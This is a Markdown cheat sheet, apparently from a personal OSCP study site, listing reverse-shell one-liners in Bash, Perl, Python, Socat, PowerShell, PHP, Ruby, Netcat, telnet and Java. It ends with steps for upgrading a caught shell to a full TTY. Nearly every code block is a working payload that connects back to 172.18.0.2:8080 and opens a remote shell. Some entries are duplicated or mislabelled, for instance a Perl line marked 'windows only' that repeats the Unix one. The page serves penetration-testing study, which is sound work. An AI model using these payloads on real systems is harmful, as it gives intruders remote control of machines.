---
title: "Reverse Shell"
permalink: /oscp/reverse_shell/
excerpt: "Various tools for reverse shell's"
last_modified_at: 
toc: true
toc_sticky: true
---


# Intro

found [here](https://sentrywhale.com/documentation/reverse-shell)

# Bash

```bash
bash -i >& /dev/tcp/172.18.0.2/8080 0>&1
```

```bash
0<&196;exec 196<>/dev/tcp/172.18.0.2/8080; sh <&196 >&196 2>&196
```

```bash
sh -i >& /dev/udp/172.18.0.2/8080 0>&1
```

# Perl

```bash
perl -e 'use Socket;$i="172.18.0.2";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.18.0.2:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

windows only:
```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.18.0.2:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

#  Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.18.0.2",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# Socat

```bash
socat tcp-connect:172.18.0.2:8080 exec:bash -li,pty,stderr,setsid,sigint,sane
```


# Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("172.18.0.2",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.18.0.2',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# PHP

This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…

```bash
php -r '$sock=fsockopen("172.18.0.2",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

# Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("172.18.0.2",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


# Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option. You can also check if nc.traditional is present on your target, as it always has the -e option. nc.openbsd can sometimes also have useful options to try.
```bash
nc -e /bin/sh 172.18.0.2 8080
```

if you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back using either mkfifo
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.18.0.2 8080 >/tmp/f
```

```bash
rm -f x; mknod x p && nc 172.18.0.2 8080 0<x | /bin/bash 1>x
```

mknod
```bash
rm -f x; mknod x p && nc 172.18.0.2 8080 0<x | /bin/bash 1>x
```


# FreeBSD Reverse Shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 172.18.0.2 8080 > /tmp/f
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 172.18.0.2 8080 > /tmp/f
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 172.18.0.2 8080 > /tmp/f
```


# Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/172.18.0.2/8080;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()
```


# Upgrading shells to true shell
This will allow you to make your reverse shell a "true" shell. That mean you will be able to use CTRL+C, CTRL+[any letter] etc, arrows to navigate through your shell history, and autocomplete with tabulation. Well, basicaly, something a lil' better then the casual shitty nc reverse shell that you close by error doing a CTRL+C to kill a program.

```bash
#From your netcat reverse shell
python -c 'import pty;pty.spawn("/bin/bash");' # spawn a tty shell
^Z  # this is CTRL+Z
nofix@AttackerMachine:~# stty raw -echo
nofix@AttackerMachine:~# fg   # this wont actualy print on your shell, it's ok
# If you had a proper tty shell, you should have a full stty shell now

```

Here are a few more things you can do to improve even more your reverse shell. Those could be particuliary useful if you are facing the error "Unknown terminal type" when launching programs such as nano.
```bash
reset
# if you are asked the type of term, say : vt100
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116 # of course you should change the rows and columns values according to your terminal size. You can get your terminal current rows and column using : stty -a

```